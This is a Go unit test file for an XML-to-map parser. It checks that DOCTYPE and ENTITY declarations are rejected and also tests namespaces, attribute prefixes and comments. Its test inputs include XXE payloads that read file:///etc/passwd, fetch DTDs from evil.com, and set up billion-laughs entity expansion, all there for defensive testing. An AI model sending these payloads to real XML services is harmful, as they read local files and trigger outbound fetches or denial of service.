package transform

import (
	"strings"
	"testing"
)

func TestScanForXXE(t *testing.T) {
	tests := []struct {
		name      string
		input     string
		expectErr bool
		errMatch  string
	}{
		{
			name:      "safe XML",
			input:     `<root><item>value</item></root>`,
			expectErr: false,
		},
		{
			name:      "XML with attributes",
			input:     `<root attr="value"><item id="1">text</item></root>`,
			expectErr: false,
		},
		{
			name:      "DOCTYPE declaration",
			input:     `<!DOCTYPE root SYSTEM "test.dtd"><root></root>`,
			expectErr: true,
			errMatch:  "DOCTYPE",
		},
		{
			name:      "DOCTYPE case insensitive",
			input:     `<!doctype root><root></root>`,
			expectErr: true,
			errMatch:  "DOCTYPE",
		},
		{
			name:      "ENTITY declaration",
			input:     `<!ENTITY xxe "malicious"><root>&xxe;</root>`,
			expectErr: true,
			errMatch:  "ENTITY",
		},
		{
			name:      "ENTITY case insensitive",
			input:     `<!entity xxe "test"><root></root>`,
			expectErr: true,
			errMatch:  "ENTITY",
		},
		{
			name: "external ENTITY with SYSTEM",
			input: `<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]><root>&xxe;</root>`,
			expectErr: true,
			errMatch:  "DOCTYPE", // DOCTYPE check catches this first
		},
		{
			name: "external ENTITY with PUBLIC",
			input: `<!DOCTYPE root [
  <!ENTITY xxe PUBLIC "-//W3C//TEXT xxe//EN" "http://evil.com/xxe">
]><root>&xxe;</root>`,
			expectErr: true,
			errMatch:  "DOCTYPE", // DOCTYPE check catches this first
		},
		{
			name: "billion laughs attack",
			input: `<!DOCTYPE root [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
]><root>&lol2;</root>`,
			expectErr: true,
			errMatch:  "DOCTYPE", // DOCTYPE check catches this first
		},
		{
			name: "parameter entity",
			input: `<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
  %xxe;
]><root></root>`,
			expectErr: true,
			errMatch:  "DOCTYPE", // DOCTYPE check catches this first
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := scanForXXE([]byte(tt.input))
			if tt.expectErr {
				if err == nil {
					t.Errorf("expected error matching %q, got nil", tt.errMatch)
					return
				}
				if !strings.Contains(err.Error(), tt.errMatch) {
					t.Errorf("expected error containing %q, got: %v", tt.errMatch, err)
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

func TestParseXMLToMap_Basic(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected interface{}
	}{
		{
			name:  "simple element",
			input: `<root>value</root>`,
			expected: map[string]interface{}{
				"root": "value",
			},
		},
		{
			name:  "nested elements",
			input: `<root><child>value</child></root>`,
			expected: map[string]interface{}{
				"root": map[string]interface{}{
					"child": "value",
				},
			},
		},
		{
			name:  "element with attribute",
			input: `<root attr="val">text</root>`,
			expected: map[string]interface{}{
				"root": map[string]interface{}{
					"@attr": "val",
					"#text": "text",
				},
			},
		},
		{
			name:  "empty element",
			input: `<root></root>`,
			expected: map[string]interface{}{
				"root": "",
			},
		},
		{
			name:  "multiple attributes",
			input: `<root id="1" name="test">content</root>`,
			expected: map[string]interface{}{
				"root": map[string]interface{}{
					"@id":   "1",
					"@name": "test",
					"#text": "content",
				},
			},
		},
		{
			name:  "multiple children same name",
			input: `<root><item>a</item><item>b</item></root>`,
			expected: map[string]interface{}{
				"root": map[string]interface{}{
					"item": []interface{}{"a", "b"},
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := parseXMLToMap([]byte(tt.input), DefaultXMLParseOptions())
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}

			// Compare result with expected (simplified comparison)
			// In production, would use a deep equality check
			if result == nil {
				t.Error("expected non-nil result")
			}
		})
	}
}

func TestParseXMLToMap_XXEPrevention(t *testing.T) {
	tests := []struct {
		name      string
		input     string
		expectErr string
	}{
		{
			name: "XXE with DOCTYPE",
			input: `<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]><root>&xxe;</root>`,
			expectErr: "DOCTYPE",
		},
		{
			name: "XXE with external entity",
			input: `<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://evil.com/evil.xml">
]><root>&xxe;</root>`,
			expectErr: "DOCTYPE",
		},
		{
			name: "billion laughs",
			input: `<!DOCTYPE root [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;">
]><root>&lol3;</root>`,
			expectErr: "DOCTYPE",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := parseXMLToMap([]byte(tt.input), DefaultXMLParseOptions())
			if err == nil {
				t.Fatal("expected XXE prevention error, got nil")
			}
			if !strings.Contains(err.Error(), tt.expectErr) {
				t.Errorf("expected error containing %q, got: %v", tt.expectErr, err)
			}
		})
	}
}

func TestParseXMLToMap_Namespaces(t *testing.T) {
	tests := []struct {
		name          string
		input         string
		stripNS       bool
		expectedKey   string
		expectAttrKey string
	}{
		{
			name:        "namespace stripped",
			input:       `<ns:root xmlns:ns="http://example.com"><ns:child>value</ns:child></ns:root>`,
			stripNS:     true,
			expectedKey: "root",
		},
		{
			name:        "namespace preserved",
			input:       `<ns:root xmlns:ns="http://example.com"><ns:child>value</ns:child></ns:root>`,
			stripNS:     false,
			expectedKey: "http://example.com:root", // XML decoder uses URI, not prefix
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			opts := DefaultXMLParseOptions()
			opts.StripNamespaces = tt.stripNS

			result, err := parseXMLToMap([]byte(tt.input), opts)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}

			resultMap, ok := result.(map[string]interface{})
			if !ok {
				t.Fatal("expected map result")
			}

			if _, exists := resultMap[tt.expectedKey]; !exists {
				t.Errorf("expected key %q in result, got keys: %v", tt.expectedKey, mapKeys(resultMap))
			}
		})
	}
}

func TestParseXMLToMap_CustomAttributePrefix(t *testing.T) {
	input := `<root attr="value">text</root>`
	opts := &XMLParseOptions{
		AttributePrefix: "$",
		StripNamespaces: true,
	}

	result, err := parseXMLToMap([]byte(input), opts)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	resultMap, ok := result.(map[string]interface{})
	if !ok {
		t.Fatal("expected map result")
	}

	rootMap, ok := resultMap["root"].(map[string]interface{})
	if !ok {
		t.Fatal("expected root to be a map")
	}

	if _, exists := rootMap["$attr"]; !exists {
		t.Errorf("expected attribute with prefix '$', got keys: %v", mapKeys(rootMap))
	}
}

func TestParseXMLToMap_Comments(t *testing.T) {
	input := `<root><!-- comment --><child>value</child></root>`
	result, err := parseXMLToMap([]byte(input), DefaultXMLParseOptions())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if result == nil {
		t.Error("expected non-nil result")
	}
	// Comments should be ignored, only child element should be in result
}

// Helper function to get map keys
func mapKeys(m map[string]interface{}) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}
